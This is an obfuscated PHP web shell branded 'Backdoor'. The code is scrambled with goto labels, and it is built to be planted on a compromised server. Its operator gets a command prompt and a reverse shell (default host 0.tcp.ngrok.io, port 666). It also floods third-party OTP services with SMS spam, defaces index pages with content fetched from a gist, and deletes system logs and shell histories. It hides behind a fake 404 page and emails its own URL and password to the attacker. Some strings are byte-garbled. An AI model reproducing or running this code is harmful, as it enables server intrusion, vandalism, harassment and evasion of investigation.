         goto Cn_Hp;
         tN7JA: yh0cE: goto KRkSY;
         mTvp3: echo "<hr>Send OTP To \55\76\40" . $on . "<hr>";
         goto zozos;
         Cn_Hp: Nlyyo("https\72/\57www\56phd\56co.id\57en\57users\57sendOTP", "phone_number=" . $on);
         goto tN7JA;
         KRkSY:
     }
     goto BDIiS;
     HtkVY: Olvjd: goto kfulV;
     Eec0M: goto yC5Wq;
     goto tdywn;
     OwEfv: $x++;
     goto V9k_V;
     fRA5y: $no = str_replace("\40", '', $no);
     goto rzMqz;
     kfulV: if (!($x < 100)) {
         goto BEoWj;
     }
     goto efcZD;
     BDIiS: ns5BD: goto wu0KG;
     sz0tu: foreach ($no as $on) {
         goto FY2wO;
         FY2wO: echo "<hr>Calling\11 \55> " . $on . "\74hr>";
         goto Tb0W2;
         QcNzq: wrdvW: goto u0GUw;
         Tb0W2: nLyYO("https:\57\57www\56tokocash\56com/oauth/otp", "msisdn=" . $on . "\46accept\75call");
         goto QcNzq;
         u0GUw:
     }
     goto WviUo;
     VRY1K: die;
     goto Eec0M;
     K01Ds: BEoWj: goto SLw0m;
     yGgBc: ?>
<center>
		<h2>Multi Spam SMS</h2>
		<form method="post">
			<textarea name="no" class="form-control" id="textarea"
				placeholder='No HP ex : 888218005037 ' required cols="" rows=""></textarea>
			<br> <input type="submit" name="action" class="btn btn-danger" />
		</form>
	</center>
<?php  goto lLNor;
     tdywn: Ygpa0: goto Md_vl;
     wu0KG: zsbIq: goto OwEfv;
     Bsx0N: die;
     goto pc4y4;
     WviUo: iBsix: goto BzGNZ;
     rzMqz: $no = str_replace("\xa\12", "\xa", $no);
     goto sz0tu;
     pc4y4:
 } goto YRYYO; j2Kba: goto CJNkO; goto btcVT; M29w9: if ($_GET["do"] == "open" and isset($_GET["dir"])) {
     goto kJyiJ;
 } goto aaD85; d940G: function jJANc($filename)
 {
     goto QSXZ_;
     xvKec: AVszr: goto ia0DG;
     ia0DG: ?>
   <form method='post'>
		<center>
			<td>Filename : <input type='text' class='input-sm' id='input'
				value='<?php  goto A1Ehh;
     uA17i: jjixg("Success");
     goto cy3MG;
     McCVo: goto aQM3J;
     goto E5fJq;
     QSXZ_: if (!isset($_POST["action"])) {
         goto AVszr;
     }
     goto ce2Kz;
     E5fJq: QUGiY: goto uA17i;
     A1Ehh: echo $filename;
     goto iYHz4;
     ce2Kz: if (@rename($filename, $_POST["newname"])) {
         goto QUGiY;
     }
     goto VQAd_;
     cy3MG: aQM3J: goto zX5gI;
     zX5gI: TnBrl();
     goto xvKec;
     VQAd_: JJiXG("Permission\40Denied");
     goto McCVo;
     iYHz4: ?>' name='newname'></td> <input
				type='submit' class='btn btn-danger' name='action' value='rename'>
		</center>
	</form>
	<?php  goto tep_k;
     tep_k: die;
     goto Qkzhs;
     Qkzhs:
 } goto KXAl7; GP2Ek: k3J3z(); goto j2Kba; ndz_0: function hnMnJ()
 {
     goto AWrmf;
     VtCA8: XsmTY: goto hxy6J;
     vAqLC: ux4Pj("{$errstr} \50{$errno})");
     goto qjLD6;
     b3FZ3: $input = fread($sock, $chunk_size);
     goto w2MBU;
     TiYzg: Lr9Gv: goto Uvy_Q;
     Jpe_l: if ($sock) {
         goto XsmTY;
     }
     goto vAqLC;
     KCXam: function uX4PJ($string)
     {
         goto Oqm46;
         qpkSQ: if ($daemon) {
             goto xIRyh;
         }
         goto PPoZz;
         QdRzk: xIRyh: goto QWC8A;
         Oqm46: global $daemon;
         goto qpkSQ;
         PPoZz: print "{$string}\12";
         goto QdRzk;
         QWC8A:
     }
     goto B_9xj;
     hxy6J: $descriptorspec = array(0 => array("pipe", "r"), 1 => array("pipe", "w"), 2 => array("pipe", "w"));
     goto dpKR1;
     Pqa76: exit(1);
     goto DSE52;
     d4VTI: if (!in_array($sock, $read_a)) {
         goto MEwtL;
     }
     goto QwITV;
     NeM_K: $daemon = 1;
     goto JesLj;
     QVhEA: UX4PJ("SOCK READ");
     goto rYbNe;
     CoauX: umask(0);
     goto aC2Un;
     JesLj: M4yz0: goto FcilR;
     IZ42c: $chunk_size = 1400;
     goto ddYO9;
     JI657: fclose($pipes[2]);
     goto t6jtM;
     ADL1R: Ux4pJ("WARNING: Failed\40to daemonise. \40This is quite\40common\40and\40not fatal.");
     goto iSl_f;
     aPpXk: if (!$debug) {
         goto JJ1pp;
     }
     goto xGYTx;
     ddYO9: $write_a = null;
     goto TEXcD;
     h4_ny: stream_set_blocking($sock, 0);
     goto yVwp0;
     i4WYN: EiPhq: goto h6Sol;
     BUgg4: if (is_resource($process)) {
         goto vtgqz;
     }
     goto hixi0;
     rYbNe: jmOl9: goto b3FZ3;
     acpcj: goto EiPhq;
     goto oEO7l;
     p5SWi: exit(1);
     goto oRdYf;
     dpKR1: $process = proc_open($shell, $descriptorspec, $pipes);
     goto BUgg4;
     yoop2: if (!($pid == -1)) {
         goto L66QO;
     }
     goto UPYhD;
     iSl_f: goto M4yz0;
     goto uYEX_;
     MCrGV: if (!$debug) {
         goto kzHf7;
     }
     goto ozVEN;
     uYEX_: sXKoz: goto DSXR3;
     VB79R: $debug = 0;
     goto km4U9;
     N_dkf: kmVYk: goto Ogtyn;
     oDAd7: JJ1pp: goto w_eb_;
     aC2Un: $sock = fsockopen($ip, $port, $errno, $errstr, 30);
     goto Jpe_l;
     w2MBU: if (!$debug) {
         goto bjXkY;
     }
     goto xyHe8;
     X0CGF: $num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);
     goto d4VTI;
     N_aOB: stream_set_blocking($pipes[1], 0);
     goto v7cIP;
     K133l: Gerk7: goto aa_6I;
     JuMLP: $daemon = 0;
     goto VB79R;
     U74x2: bjXkY: goto rDuhH;
     Kz71S: LUsWJ: goto u8be6;
     u18Y8: if (!in_array($pipes[2], $read_a)) {
         goto LUsWJ;
     }
     goto aPpXk;
     XeAIf: if (!$pid) {
         goto Lr9Gv;
     }
     goto QlKfl;
     h6Sol: fclose($sock);
     goto ySLPn;
     rLr_R: fclose($pipes[1]);
     goto JI657;
     wYrmx: nH59i: goto DiGxl;
     QlKfl: exit(0);
     goto TiYzg;
     oRdYf: L66QO: goto XeAIf;
     AWrmf: if (isset($_POST["action"])) {
         goto sGFej;
     }
     goto sX2M3;
     iaPNR: zAEGj: goto u18Y8;
     yVwp0: Ux4pj("<font color\75yellow>Successfully\40opened reverse\40shell to\40{$ip}\72{$port} <\57font>");
     goto wYrmx;
     CXiR0: if (!feof($pipes[1])) {
         goto U5lzq;
     }
     goto yfJB6;
     ySLPn: fclose($pipes[0]);
     goto rLr_R;
     xGYTx: uX4pj("STDERR\40READ");
     goto oDAd7;
     nVOwv: die;
     goto V4hTm;
     TEXcD: $error_a = null;
     goto JuMLP;
     rDuhH: fwrite($pipes[0], $input);
     goto DCwvK;
     sX2M3: ?>
<center>
<h2>Reverse Shell</h2>
<form method='post'>
	<table align="center">
	<tr>
		<td align="center"><input type='text' class='input-sm' id='input' value='0.tcp.ngrok.io' name='ip'/></td>
	</tr>
	<tr>
		<td align="center"><input type='text' class='input-sm' id='input' value='666' name='port'/></td>
	</tr>
	<tr>
		<td colspan="3">
			<center>
				<input type='submit' class='btn btn-danger' name='action' value='Open Connection'/>
			</center>
		</td>
	</tr>
</table>
</form>
	<?php  goto nVOwv;
     yfJB6: ux4Pj("ERROR\72\40Shell\40process\40terminated");
     goto acpcj;
     fnlVr: T5NcQ: goto NeM_K;
     hixi0: UX4PJ("ERROR:\40Can\47t\40spawn shell");
     goto Pqa76;
     hYpTp: sGFej: goto IZ42c;
     DCwvK: MEwtL: goto fpiy6;
     DSE52: vtgqz: goto zAr8Q;
     Sr6dw: exit(1);
     goto fnlVr;
     HHTlE: goto EiPhq;
     goto ubmAe;
     Rio3t: if (!$debug) {
         goto Gerk7;
     }
     goto aoY0j;
     u8be6: goto nH59i;
     goto i4WYN;
     lgcUM: sdkbx: goto kdvhl;
     w_eb_: $input = fread($pipes[2], $chunk_size);
     goto MCrGV;
     uxrYt: uX4Pj("ERROR\72 Shell\40connection\40terminated");
     goto HHTlE;
     QwITV: if (!$debug) {
         goto jmOl9;
     }
     goto QVhEA;
     Ogtyn: $input = fread($pipes[1], $chunk_size);
     goto Rio3t;
     v7cIP: stream_set_blocking($pipes[2], 0);
     goto h4_ny;
     t6jtM: proc_close($process);
     goto lgcUM;
     aoY0j: Ux4pJ("STDOUT: {$input}");
     goto K133l;
     wfesc: UX4pJ("STDOUT READ");
     goto N_dkf;
     TLkda: if (!feof($sock)) {
         goto BOjn4;
     }
     goto uxrYt;
     xyHe8: ux4pJ("SOCK: {$input}");
     goto U74x2;
     VYdYD: kzHf7: goto bg2sL;
     ozVEN: Ux4pj("STDERR\72\40{$input}");
     goto VYdYD;
     Uvy_Q: if (!(O1U31() == -1)) {
         goto T5NcQ;
     }
     goto ivqxt;
     DiGxl: if (!1) {
         goto EiPhq;
     }
     goto TLkda;
     UPYhD: UX4Pj("ERROR\72 Can\47t fork");
     goto p5SWi;
     km4U9: $ip = $_POST["ip"];
     goto o7dsZ;
     aa_6I: fwrite($sock, $input);
     goto iaPNR;
     bg2sL: fwrite($sock, $input);
     goto Kz71S;
     FcilR: chdir("\57");
     goto CoauX;
     fpiy6: if (!in_array($pipes[1], $read_a)) {
         goto zAEGj;
     }
     goto whJ9k;
     d5CVl: $read_a = array($sock, $pipes[1], $pipes[2]);
     goto X0CGF;
     whJ9k: if (!$debug) {
         goto kmVYk;
     }
     goto wfesc;
     zAr8Q: stream_set_blocking($pipes[0], 0);
     goto N_aOB;
     ubmAe: BOjn4: goto CXiR0;
     DSXR3: $pid = IfKDF();
     goto yoop2;
     oEO7l: U5lzq: goto d5CVl;
     ivqxt: uX4PJ("Error\72 Can\47t setsid\50\51");
     goto Sr6dw;
     qjLD6: exit(1);
     goto VtCA8;
     o7dsZ: $port = $_POST["port"];
     goto KCXam;
     V4hTm: goto sdkbx;
     goto hYpTp;
     B_9xj: if (function_exists("ifkdf")) {
         goto sXKoz;
     }
     goto ADL1R;
     kdvhl:
 } goto T3NUU; P5p0o: if ($_GET["do"] == "config") {
     goto OExGh;
 } goto Linvc; eptYg: SpMG1($_GET["files"]); goto g5XV0; OToAi: if ($_GET["do"] == "jumping") {
     goto qH8q8;
 } goto P5p0o; AhvnH: if (copy($_FILES["file"]["tmp_name"], getcwd() . $sep . $_FILES["file"]["name"])) {
     goto cVxIB;
 } goto rA38k; oUttM: function UIeKR()
 {
     goto hmsid;
     krgNl: @T9GAW("/var/run\57utmp");
     goto sneM1;
     sneM1: @t9gAW("\57var\57logs");
     goto apb5X;
     apb5X: @t9gaW("/var/log");
     goto OGHTH;
     OGHTH: @T9Gaw("/var\57adm");
     goto qYhF3;
     Sic05: @T9gAw("error_log");
     goto A5ppO;
     Q7oXB: lxANx: goto d83M8;
     ELh46: @T9Gaw("/var/log\57wtmp");
     goto MDZUd;
     d83M8: @t9GAw(".config");
     goto k8SzY;
     Uxi6c: jjIxG("Logs\40is\40clear");
     goto NDrs9;
     skCe5: foreach (range("A", "Z") as $drive) {
         goto jpjRS;
         c2SMB: B8rjw: goto MbXBc;
         jpjRS: @T9GAW($drive . "\72\xampp\apache\logs\error\56log");
         goto QINQJ;
         QINQJ: @t9gAW($drive . ":\xampp\apache\logs\access.log");
         goto c2SMB;
         MbXBc:
     }
     goto Q7oXB;
     A5ppO: CIi80: goto Uxi6c;
     z6mLC: @t9Gaw("\57var/apache/log");
     goto krgNl;
     k8SzY: goto CIi80;
     goto ZlYyz;
     bZFBQ: @t9gAw("\57usr/local\57apache/log");
     goto zUPhI;
     I5Kuh: @T9gAW("/root/\56bash_history");
     goto tvLA8;
     jBL66: @t9GaW("\57etc/utmp");
     goto Z5TxT;
     hmsid: global $os;
     goto mXtLh;
     MDZUd: @t9GAW("\56config");
     goto Sic05;
     tvLA8: @T9GAw("/root/\56bash_logout");
     goto G86Ut;
     Z5TxT: @T9GAw("/var/log/lastlog");
     goto ELh46;
     zUPhI: @t9gAw("\57var\57apache\57logs");
     goto z6mLC;
     ZlYyz: BDpqJ: goto rFTz2;
     iKHwL: @t9gaw("\57root\57\56ksh_history");
     goto I5Kuh;
     G86Ut: @t9GaW("/usr\57local\57apache\57logs");
     goto bZFBQ;
     qYhF3: @t9gaw("\57etc/wtmp");
     goto jBL66;
     mXtLh: if ($os == "Linux") {
         goto BDpqJ;
     }
     goto skCe5;
     rFTz2: @t9gAW("/tmp\57logs");
     goto iKHwL;
     NDrs9:
 } goto rgZdR; s63LX: w41X1: goto v0HnU; kWim3: exit; goto PoQ0Q; uZ0y4: vL5pr: goto UQWtE; lALpc: goto Jkk29; goto WdooI; tUoBK: if ($_GET["do"] == "cgi") {
     goto zV8YQ;
 } goto Kk0wn; CHviX: if ($_GET["do"] == "cmd") {
     goto UdMDI;
 } goto haBwC; bB4u4: goto Jkk29; goto qmWpE; buNrn: goto Jkk29; goto ANdEW; Kk0wn: if ($_GET["do"] == "deface") {
     goto zBGpp;
 } goto v33r3; PoQ0Q: vdcmX: goto q3ebb; d3Ydz: ?>
<!DOCTYPE html>
<html>
<head>
	<title>Backdoor</title>
	<!-- CSS STYLE-->
	<meta charset="utf-8" />
	<meta http-equiv="X-UA-Compatible" content="IE=edge" />
	<meta name="viewport" content="width=device-width, initial-scale=1.0" />
	<link rel="shortcut icon" href="https://cvar1984.github.io/favicon.png" />
	<link href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap.min.css" rel="stylesheet" />
	<script src="https://ajax.googleapis.com/ajax/libs/jquery/1.11.3/jquery.min.js" type="text/javascript"></script>
	<script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/js/bootstrap.min.js" type="text/javascript"></script>
	<style type='text/css'>
	body {
		background: black;
		color: lavender;
		text-shadow: 2px 2px 4px #000000;
		background: url(https://cvar1984.github.io/bg-2.jpg) no-repeat center center fixed;
		-webkit-background-size: cover;
		-moz-background-size: cover;
		-o-background-size: cover;
		background-size: cover;
	}

	@font-face {
		font-family: 'Orbitron';
		font-style: normal;
		font-weight: 700;
		src: local('Orbitron Bold'), local('Orbitron-Bold'),
		url(http://fonts.gstatic.com/s/orbitron/v9/yMJWMIlzdpvBhQQL_QIAUjh2qtA.woff2) format('woff2');
		unicode-range: U+0000-00FF, U+0131, U+0152-0153, U+02BB-02BC, U+02C6,
		U+02DA, U+02DC, U+2000-206F, U+2074, U+20AC, U+2122, U+2191, U+2193,
		U+2212, U+2215, U+FEFF, U+FFFD;
	}

	li {
		display: inline;
		text-shadow: 2px 2px 4px #000000;
		font-size: 17px;
	}

	a {
		color: lime;
	}

	a:hover {
		color: black;
	}

	table,
	tr,
	td {
		border: 1px;
		-webkit-border: 1px;
		-moz-border: 1px;
		-o-border: 1px;
	}

	table {
		-webkit-width:800px;
		-moz-width:800px;
		-o-width:800px;
		-webkit-height:auto;
		-moz-height:auto;
		-o-height:auto;
		width:800px;
		height:auto;
	}

	nav {

	}

	.table-hover {
		border: 1px solid green;
		cellpadding: 3;
		cellspacing: 3;
		font-size: 15px;
	}

	#textarea {
		background: url(https://cvar1984.github.io/textarea-bg.jpg) no-repeat center center fixed;
		-webkit-background-size: cover;
		-moz-background-size: cover;
		-o-background-size: cover;
		background-size: cover;
		width: 1066px;
		height: 500px;
		font-family: Arial, Helvetica, monospace;
		color: lavender;
		border: 1px solid lime;
	}

	#input {
		background: transparent;
		width: 250px;
		font-family: Arial, Helvetica, monospace;
		color: lavender;
		border: 1px solid lime;
	}

	#menu {}

	* {
		font-family: 'Orbitron';
	}

	.icon {
		width: 20px;
		height: 20px;
	}
	.iframe {
		-webkit-width: 100vw;
		-moz-width: 100vw;
		-o-width: 100vw;
		width: 100vw;
		height: 100vh;
		position: relative;
	}
	span {
		color:red;
	}
	</style>
</head>
<body>
<?php  goto xqfOY; xD83Z: A4P0T(); goto prBdu; s08OF: function uHcbw()
 {
     goto Qffdx;
     Timcq: RMs_m: goto xbnuI;
     CvLGg: PoF8r: goto KeWoN;
     wOdOQ: jjIxG("index.php\40Defaced");
     goto Timcq;
     xU8IC: $file = str_replace("Just Joke\40:v", $_POST["alert"], $file);
     goto YluzR;
     Z7RC6: if (file_exists("index.php")) {
         goto uvDjW;
     }
     goto rON0Z;
     njm5E: ?>
<center><h2>Auto Deface With Backup</h2></center>
<form method='post'>
	<table align="center">
		<tr>
			<td>Title</td> <td>:</td>
			<td><input type='text' class='input-sm' id='input' value='Hacked By Cvar1984' name='title'></td>
			</tr>
		<tr>
			<td>Alert Message</td> <td>:</td> 
			<td><input type='text' class='input-sm' id='input' value='Just Joke :v' name='alert'></td>
			</tr>
		<tr>
			<td>Music Link</td> <td>:</td> 
			<td><input type='text' class='input-sm' id='input' value='https://cvar1984.github.io/bg.mp3' name='music'></td>
			</tr>
		<tr>
			<td>Image Link</td> <td>:</td> 
			<td><input type='text' class='input-sm' id='input' value='https://cvar1984.github.io/logo.png' name='images'></td>
			</tr>
		<tr>
			<td>Content</td> <td>:</td>
			<td><input type='text' class='input-sm' id='input' value='Hacked By Cvar1984' name='content'></td>
			</tr>
		<tr>
			<td>Sub Content</td> <td>:</td>
			<td><input type='text' class='input-sm' id='input' value='This Pain Is Wonderful' name='sub_content'></td>
			</tr>
		</table>
		<center>
			<br /><input type='submit' class='btn btn-danger' name='action' value='Deface'>
		</center>
</form>
	<?php  goto noiJ8;
     BKRdV: goto gHwL8;
     goto m_eBL;
     noiJ8: die;
     goto AfVFV;
     vkuQQ: if (!file_put_contents("index.php", $file)) {
         goto RMs_m;
     }
     goto wOdOQ;
     kXth9: chmod("index\56php.bak", "044\64");
     goto vkuQQ;
     Zu9DK: $file = str_replace("\74h\61>Hacked By Cvar19Ä\74/h\61\76", "<h\61\76" . $_POST["content"] . "</h1>", $file);
     goto f8ui7;
     QUDth: if (!file_put_contents("index.php", $file)) {
         goto EP_0f;
     }
     goto O5tAE;
     O5tAE: JJiXG("index.php Defaced");
     goto znHhG;
     xbnuI: goto gHwL8;
     goto CvLGg;
     f8ui7: $file = str_replace("<h\64\76This\40Pain\40Is Wonderful\74/h\64>", "<h4\76" . $_POST["sub_content"] . "\74\57h\64>", $file);
     goto Z7RC6;
     rzEjr: IEUze: goto p3_3m;
     O1tJA: $file = str_replace("<title\76Hacked\40By Cvar19Ä</title>", "<title>" . $_POST["title"] . "\74/title>", $file);
     goto K2nMX;
     p3_3m: gHwL8: goto pk0A6;
     YluzR: $file = str_replace("https\72/\57minervagunceleri\56files\56wordpress.com/20\61\64\570\57logo.png", $_POST["images"], $file);
     goto Zu9DK;
     wM7NK: if (!file_put_contents("index\56html", $file)) {
         goto IEUze;
     }
     goto tLaAa;
     K2nMX: $file = str_replace("https:\57\57cvar198\64.github.io/bg\56mp\63", $_POST["music"], $file);
     goto xU8IC;
     drh5w: rename("index.php", "index.php.bak");
     goto kXth9;
     m_eBL: uvDjW: goto drh5w;
     TKbmP: chmod("index\56html.bak", "„44");
     goto wM7NK;
     tLaAa: jjIxg("index\56html Defaced");
     goto rzEjr;
     pk0A6: h4B8O: goto njm5E;
     Qffdx: if (!isset($_POST["action"])) {
         goto h4B8O;
     }
     goto Ycw7z;
     Ycw7z: $file = file_get_contents("https:\57\57gist.githubusercontent\56com/Cvar194/\63bfdd8d2c09f8\708440a9f¼f6‰\64a„\57raw/\709¨8d8\60ec\67eba5\67\63bfb9\61af\60Â5Æe26bf¹e\64/index\56php");
     goto O1tJA;
     rON0Z: if (file_exists("index\56html")) {
         goto PoF8r;
     }
     goto QUDth;
     KeWoN: rename("index\56html", "index\56html.bak");
     goto TKbmP;
     znHhG: EP_0f: goto BKRdV;
     AfVFV:
 } goto pxJ_h; q1mxz: IIev0: goto eVXgr; mMTy_: goto Jkk29; goto bM1qs; f8uYC: goto Jkk29; goto JdLdN; qdGnG: @mail($email, "Logs", $content_mail, "From\72Cvar1\71\70\64"); goto n4U_N; XHZO8: goto Jkk29; goto v1c6o; pDr2s: $dir = scandir(getcwd()); goto SmrFX; v1c6o: kJyiJ: goto m8Vl9; wxaII: if ($_GET["do"] == "delete" and isset($_GET["files"])) {
     goto q7lM0;
 } goto lYqT1; rA38k: JjiXg("Upload\40Failed"); goto L1bpu; bBZU9: function glsbx()
 {
     goto M4ksq;
     qCvTp: if (!isset($_POST["command"])) {
         goto xIkZC;
     }
     goto u_LzW;
     WrGHP: ?>
<center>
		<form method="post">
			<input type="text" class='input-sm' id='input' name="command" /> <input
				type="submit" class="btn btn-danger" />
		</form>
	</center>
	<form></form>
<?php  goto X5M8A;
     u_LzW: echo "\74center>\74textarea\40id='textarea\47 class=\47form\55control' readonly\76" . U4tUx($_POST["command"]) . "</textarea\76\74/center>";
     goto MezQW;
     X5M8A: die;
     goto NkcVE;
     MezQW: xIkZC: goto WrGHP;
     M4ksq: echo "\74center>\74h2>Command Prompt</h2\76<\57center>";
     goto qCvTp;
     NkcVE:
 } goto d940G; Dn0ba: TnBrl(); goto G7bgQ; neAj8: chdir($dir); goto FZCUK; wb8wZ: $sep = "/"; goto zknN1; pGXIU: pQmVw: goto BV3jv; DdRy8: VZy1Y($_GET["dir"]); goto VGEHJ; vQ3dI: M4L6u(); goto buNrn; nLbsJ: if (!function_exists("file_put_contents")) {
     echo "\74script>alert\50'file_put_contents\40function disabled\54\40this\40webshell\40not working properly\47)\74\57script>";
 } goto YeyTs; v33r3: if ($_GET["do"] == "shortlink") {
     goto kX6ei;
 } goto IxX6P; AmxkD: jjiXg("Upload\40Success"); goto gRcNX; lTD8w: if ($_GET["do"] == "network") {
     goto uWVJj;
 } goto mMTy_; WdooI: t30L2: goto Eft_I; aZCmH: Ve1hM: goto jyqm9; tsNUj: UHcBW(); goto E_3T1; cxDMj: function VzY1Y($dir)
 {
     goto w2sdb;
     jXHBz: goto dDIz5;
     goto MCuMY;
     NXgDP: jjIXg("Success");
     goto qdGEw;
     w2sdb: if (@mkdir($dir . "/" . "new_dir")) {
         goto WTq_G;
     }
     goto oZgmR;
     MCuMY: WTq_G: goto NXgDP;
     oZgmR: JjIxg("Permission\40Denied Or\40File\40Exists");
     goto jXHBz;
     qdGEw: dDIz5: goto IHEUJ;
     IHEUJ:
 } goto upQzj; wi8wr: uWVJj: goto ctUzc; VHd9t: goto XGeZ9; goto q1mxz; haBwC: if ($_GET["do"] == "logs") {
     goto Ve1hM;
 } goto tUoBK; NQAe_: $_SESSION[sha1(md5($_SERVER["HTTP_HOST"]))] = true; goto BZ_hd; BWB1O: if ($_GET["do"] == "touch" and isset($_GET["files"])) {
     goto w41X1;
 } goto lTD8w; aux2O: gYzgO(); goto bB4u4; Fhp6L: L1ZR1(); goto GJDO7; ctUzc: HNMnj(); goto ThQCb; YeyTs: $shell_path = $content_mail = "URL\40\72 http://" . $_SERVER["SERVER_NAME"] . $_SERVER["REQUEST_URI"] . "\12\12IP\40\72 " . $_SERVER["REMOTE_ADDR"] . "\12\12Password\40:\40" . $auth_pass . "\12\xaBy\40Cvar1Ä"; goto Sp_ot; bn54s: function K3j3z()
 {
     goto wzIkj;
     gTkcD: exit;
     goto soEyj;
     rOmAV: echo $_SERVER["PHP_SELF"];
     goto N4JS1;
     N4JS1: ?> was not found on this server.</p>
<p>Additionally, a 404 Not Found
error was encountered while trying to use an ErrorDocument to handle the request.</p>
<?php  goto gTkcD;
     wzIkj: ?>
<title>404 Not Found</title>
<h1>Not Found</h1>
<p>The requested URL <?php  goto rOmAV;
     soEyj:
 } goto JfUXZ; JdLdN: OExGh: goto vQ3dI; FZCUK: goto Jkk29; goto Hz6Gx; d_edT: YccVm(); goto lALpc; KXAl7: function UEqDa($filename)
 {
     goto QDMVj;
     RbMM9: nizoE: goto wi1jx;
     j48C1: die;
     goto unN1f;
     jD5Mo: goto nizoE;
     goto UCRmK;
     UCRmK: d3Rpm: goto ni7xo;
     Q0ZX0: U0rbo: goto LSHZo;
     wi1jx: tnBRL();
     goto Q0ZX0;
     LSHZo: ?>
   <form method='post'>
		<center>
			<td>Permission : <input type='text' class='input-sm' id='input'
				value='0755' name='permission'></td> <input type='submit'
				class='btn btn-danger' name='action' value='chmod'>
		</center>
	</form>
	<?php  goto j48C1;
     zUEaS: if (chmod($filename, $_POST["permission"])) {
         goto d3Rpm;
     }
     goto UZgRY;
     ni7xo: JJixG("Success");
     goto RbMM9;
     UZgRY: JjiXG("Permission\40Denied");
     goto jD5Mo;
     QDMVj: if (!isset($_POST["action"])) {
         goto U0rbo;
     }
     goto zUEaS;
     unN1f:
 } goto oUttM; Db0q_: XGeZ9: goto kN_m_; GJDO7: goto Jkk29; goto GS__n; zknN1: $os = "Linux"; goto s5SwB; DgSHm: c5S6g(); goto f8uYC; GS__n: zBGpp: goto tsNUj; m8Vl9: $dir = $_GET["dir"]; goto neAj8; tVkjr: kX6ei: goto xD83Z; q3ebb: S1ihE: goto bn54s; nENXh: Jjanc($_GET["files"]); goto YVxpL; yTS4n: function Spmg1($filename)
 {
     jJIxg("this extension is not\40supported");
     tNBrL();
 } goto deCzC; Eft_I: xiZFI($_GET["files"]); goto XHZO8; BV3jv: YqYC7(); goto xtMZ1; E_3T1: goto Jkk29; goto tVkjr; tZReq: header("HTTP/1.0  \64\40Not Found"); goto kWim3; iUmx7: qH8q8: goto DgSHm; lsPIc: if (@T9Gaw($_GET["files"])) {
     goto IIev0;
 } goto wdnHz; T3NUU: ?>
<nav class="navbar navbar-inverse">
	<div class="container-fluid">
		<div class="navbar-header">
			<a class="navbar-brand" href="https://github.com/BlackHoleSecurity/backdoor">Tuzki</a>
		</div>
		<ul class="nav navbar-nav">
			<li class="active"><a href="?">Home</a></li>
			<li class="dropdown"><a class="dropdown-toggle" data-toggle="dropdown" href="#">Tools <span class="caret"></span></a>
				<ul class="dropdown-menu">
					<li><a href='?do=cmd'><span class="glyphicon glyphicon-list-alt"></span> Command Prompt</a></li>
					<li><a href='?do=sms'><span class="glyphicon glyphicon-envelope"></span> Spam SMS</a></li>
					<li><a href='?do=music'><span class="glyphicon glyphicon-headphones"></span> Music</a></li>
					<li><a href='?do=jumping'><span class="glyphicon glyphicon-transfer"></span> Jumping</a></li>
					<li><a href='?do=config'><span class="glyphicon glyphicon-wrench"></span> Config</a></li>
					<li><a href='?do=mass_deface'><span class="glyphicon glyphicon-random"></span> Mass Deface</a></li>
					<li><a href='?do=info'><span class="glyphicon glyphicon-info-sign"></span> Server Info</a></li>
					<li><a href='?do=logs'><span class="glyphicon glyphicon-retweet"></span> Clear Logs</a></li>
					<li><a href='?do=cgi'><span class="glyphicon glyphicon-duplicate"></span> CGI Shell</a></li>
					<li><a href='?do=deface'><span class="glyphicon glyphicon-user"></span> Auto Deface</a></li>
					<li><a href='?do=shortlink'><span class="glyphicon glyphicon-link"></span> Shortlink Generator</a></li>
					<li><a href='?do=network'><span class="glyphicon glyphicon-globe"></span> Network</a></li>
				</ul>
			</li>
			<li><a href='?do=logout'><span class="glyphicon glyphicon-off"></span> Logout</a></li>
		</ul>
	</div>
</nav>
<?php  goto pwCJW; OI4ds: echo date("Y"); goto QjL6a; prBdu: goto Jkk29; goto lXYhF; YRYYO: function yqYc7()
 {
     goto jqEUs;
     jqEUs: echo "<center>";
     goto T3c8A;
     It7HB: die;
     goto IlAPv;
     T3c8A: echo "\74iframe\40width='7\60\60px' height\75\47\65€px' scrolling\75\47no' frameborder=\47no\47\40src='https\72\57/w\56soundcloud.com/player\57\77url=https:/\57api\56soundcloud.com\57playlists/355874É\61\46amp;color\75#€cc1\61&amp\73auto_play=true\46amp\73hide_related\75false\46amp\73show_comments=true&amp\73show_user\75true&amp;show_reposts=false&amp;show_teaser\75true&amp;visual=true\47>\74\57iframe>";
     goto q5pHX;
     q5pHX: echo "</center\76";
     goto It7HB;
     IlAPv:
 } goto XyLTN; OMq5A: goto Jkk29; goto pGXIU; zNXEM: if ($_GET["do"] == "home") {
     goto Guyes;
 } goto fP0qQ; Vw1Hz: if ($_GET["do"] == "music") {
     goto pQmVw;
 } goto OToAi; jyqm9: UIEKr(); goto g8_oj; caYUZ: function JjixG($message)
 {
     goto cemld;
     ONmgf: echo "'" . $message . "\47";
     goto terM6;
     cemld: ?>
<script type="text/javascript">
var ALERT_TITLE = "Alert";
var ALERT_BUTTON_TEXT = "Ok";
if (document.getElementById) {
	window.alert = function(txt) {
		createCustomAlert(txt);
	}
}

function createCustomAlert(txt) {
	d = document;
	if (d.getElementById("modalContainer")) return;
	mObj = d.getElementsByTagName("body")[0].appendChild(d.createElement("div"));
	mObj.id = "modalContainer";
	mObj.style.height = d.documentElement.scrollHeight + "px";
	alertObj = mObj.appendChild(d.createElement("div"));
	alertObj.id = "alertBox";
	if (d.all && !window.opera) alertObj.style.top = document.documentElement.scrollTop + "px";
	alertObj.style.left = (d.documentElement.scrollWidth - alertObj.offsetWidth) / 2 + "px";
	alertObj.style.visiblity = "visible";
	h1 = alertObj.appendChild(d.createElement("h1"));
	h1.appendChild(d.createTextNode(ALERT_TITLE));
	msg = alertObj.appendChild(d.createElement("p"));
	//msg.appendChild(d.createTextNode(txt));
	msg.innerHTML = txt;
	btn = alertObj.appendChild(d.createElement("a"));
	btn.id = "closeBtn";
	btn.appendChild(d.createTextNode(ALERT_BUTTON_TEXT));
	btn.href = "#";
	btn.focus();
	btn.onclick = function() { removeCustomAlert(); return false; }
	alertObj.style.display = "block";
}

function removeCustomAlert() {
	document.getElementsByTagName("body")[0].removeChild(document.getElementById("modalContainer"));
}
</script>
<style type="text/css">
#modalContainer {
	background-color: rgba(0, 0, 0, 0.3);
	position: absolute;
	width: 100%;
	height: 100%;
	top: 0px;
	left: 0px;
	z-index: 10000;
	/* required by MSIE to prevent actions on lower z-index elements */
}

#alertBox {
	position: relative;
	width: 300px;
	min-height: 100px;
	margin-top: 50px;
